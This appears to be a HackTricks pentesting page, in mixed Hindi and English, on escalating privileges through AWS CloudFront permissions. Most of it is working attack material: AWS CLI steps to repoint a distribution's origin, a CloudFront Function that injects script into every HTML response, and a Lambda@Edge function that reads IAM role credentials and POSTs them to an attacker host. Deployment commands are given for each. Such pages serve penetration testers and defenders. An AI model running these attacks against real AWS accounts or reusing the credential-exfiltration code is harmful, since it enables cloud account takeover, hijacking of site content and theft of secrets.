# AWS - CloudFront Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## CloudFront

### `cloudfront:UpdateDistribution` & `cloudfront:GetDistributionConfig`

जिस हमलावर के पास cloudfront:UpdateDistribution और cloudfront:GetDistributionConfig permissions हैं, वह CloudFront distribution की configuration को संशोधित कर सकता है। उन्हें target S3 bucket पर सीधे permissions की ज़रूरत नहीं होती, हालाँकि हमला तब आसान होता है जब उस bucket की permissive policy cloudfront.amazonaws.com service principal से access की अनुमति देती हो।

हमलावर distribution की origin configuration बदलकर इसे किसी दूसरे S3 bucket या हमलावर द्वारा नियंत्रित server की ओर इशारा करवा देता है। पहले वे current distribution configuration प्राप्त करते हैं:
```bash
aws cloudfront get-distribution-config --id <distribution-id> | jq '.DistributionConfig' > current-config.json
```
फिर वे current-config.json को संपादित करके origin को नए resource की ओर इंगित करते हैं — उदाहरण के लिए, एक अलग S3 bucket:
```bash
...
"Origins": {
"Quantity": 1,
"Items": [
{
"Id": "<origin-id>",
"DomainName": "<new-bucket>.s3.us-east-1.amazonaws.com",
"OriginPath": "",
"CustomHeaders": {
"Quantity": 0
},
"S3OriginConfig": {
"OriginAccessIdentity": "",
"OriginReadTimeout": 30
},
"ConnectionAttempts": 3,
"ConnectionTimeout": 10,
"OriginShield": {
"Enabled": false
},
"OriginAccessControlId": "E30N32Y4IBZ971"
}
]
},
...
```
अंत में, संशोधित कॉन्फ़िगरेशन लागू करें (अपडेट करते समय आपको वर्तमान ETag प्रदान करना होगा):
```bash
CURRENT_ETAG=$(aws cloudfront get-distribution-config --id <distribution-id> --query 'ETag' --output text)

aws cloudfront update-distribution \
--id <distribution-id> \
--distribution-config file://current-config.json \
--if-match $CURRENT_ETAG
```

### `cloudfront:UpdateFunction`, `cloudfront:PublishFunction`, `cloudfront:GetFunction`, `cloudfront:CreateFunction` and `cloudfront:AssociateFunction`
An attacker needs the permissions cloudfront:UpdateFunction, cloudfront:PublishFunction, cloudfront:GetFunction, cloudfront:CreateFunction and cloudfront:AssociateFunction to manipulate or create CloudFront functions.

The attacker creates a malicious CloudFront Function that injects JavaScript into HTML responses:

```bash
function handler(event) {
var request = event.request;
var response = event.response;
// Create a new body with malicious JavaScript
var maliciousBody = `
<!DOCTYPE html>
<html>
<head>
<title>समझौता किया गया पृष्ठ</title>
</head>
<body>
<h1>मूल सामग्री</h1>
<p>यह पृष्ठ CloudFront Functions द्वारा संशोधित किया गया है</p>
<script>
// Malicious JavaScript
alert('CloudFront Function कोड इंजेक्शन सफल हुआ!');
</script>
</body>
</html>
`;
// Replace the body entirely
response.body = { encoding: "text", data: maliciousBody };
// Update headers
response.headers["content-type"] = { value: "text/html; charset=utf-8" };
response.headers["content-length"] = {
value: maliciousBody.length.toString(),
};
response.headers["x-cloudfront-function"] = { value: "malicious-injection" };
return response;
}
```

Commands to create, publish and attach the function:

```bash
# CloudFront में malicious function बनाएं
aws cloudfront create-function --name malicious-function --function-config '{
"Comment": "Malicious CloudFront Function for Code Injection",
"Runtime": "cloudfront-js-1.0"
}' --function-code fileb://malicious-function.js

# DEVELOPMENT stage में function का ETag प्राप्त करें
aws cloudfront describe-function --name malicious-function --stage DEVELOPMENT --query 'ETag' --output text

# LIVE stage पर function को publish करें
aws cloudfront publish-function --name malicious-function --if-match <etag>
```

Add the function to the distribution configuration (FunctionAssociations):

```bash
"FunctionAssociations": {
"Quantity": 1,
"Items": [
{
"FunctionARN": "arn:aws:cloudfront::<account-id>:function/malicious-function",
"EventType": "viewer-response"
}
]
}
```

Finally update the distribution configuration (remember to supply the current ETag):

```bash
CURRENT_ETAG=$(aws cloudfront get-distribution-config --id <distribution-id> --query 'ETag' --output text)

aws cloudfront update-distribution --id <distribution-id> --distribution-config file://current-config.json --if-match $CURRENT_ETAG
```

### `lambda:CreateFunction`, `lambda:UpdateFunctionCode`, `lambda:PublishVersion`, `iam:PassRole` & `cloudfront:UpdateDistribution`

An attacker needs the lambda:CreateFunction, lambda:UpdateFunctionCode, lambda:PublishVersion, iam:PassRole and cloudfront:UpdateDistribution permissions to create and associate malicious Lambda@Edge functions. A role that can be assumed by the lambda.amazonaws.com and edgelambda.amazonaws.com service principals is also required.

The attacker creates a malicious Lambda@Edge function that steals the IAM role credentials:

```bash
// malicious-lambda-edge.js
exports.handler = async (event) => {
    // Obtain role credentials
    const credentials = {
        accessKeyId: process.env.AWS_ACCESS_KEY_ID,
        secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
        sessionToken: process.env.AWS_SESSION_TOKEN,
    };
    // Send credentials to attacker's server
    try {
        await fetch("https://<attacker-ip>/steal-credentials", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(credentials)
        });
    } catch (error) {
        console.error("Error sending credentials:", error);
    }
    if (event.Records && event.Records[0] && event.Records[0].cf) {
        // Modify response headers
        const response = event.Records[0].cf.response;
        response.headers["x-credential-theft"] = [
            {
                key: "X-Credential-Theft",
                value: "Successful",
            },
        ];
        return response;
    }
    return {
        statusCode: 200,
        body: JSON.stringify({ message: "Credentials stolen" })
    };
};
```

```bash
# Lambda@Edge फ़ंक्शन पैकेज करें
zip malicious-lambda-edge.zip malicious-lambda-edge.js

# एक privileged role के साथ Lambda@Edge फ़ंक्शन बनाएँ
aws lambda create-function \
--function-name malicious-lambda-edge \
--runtime nodejs18.x \
--role <privileged-role-arn> \
--handler malicious-lambda-edge.handler \
--zip-file fileb://malicious-lambda-edge.zip \
--region <region>

# फ़ंक्शन का एक संस्करण प्रकाशित करें
aws lambda publish-version --function-name malicious-lambda-edge --region <region>
```

Then the attacker updates the CloudFront distribution configuration to reference the published Lambda@Edge version:

```bash
"LambdaFunctionAssociations": {
"Quantity": 1,
"Items": [
{
"LambdaFunctionARN": "arn:aws:lambda:us-east-1:<account-id>:function:malicious-lambda-edge:1",
"EventType": "viewer-response",
"IncludeBody": false
}
]
}
```

```bash
# अपडेट की गई distribution config लागू करें (मौजूदा ETag का उपयोग ज़रूरी है)
CURRENT_ETAG=$(aws cloudfront get-distribution-config --id <distribution-id> --query 'ETag' --output text)

aws cloudfront update-distribution \
--id <distribution-id> \
--distribution-config file://current-config.json \
--if-match $CURRENT_ETAG

# distribution को request करके function को trigger करें
curl -v https://<distribution-domain>.cloudfront.net/
```

{{#include ../../../../banners/hacktricks-training.md}}
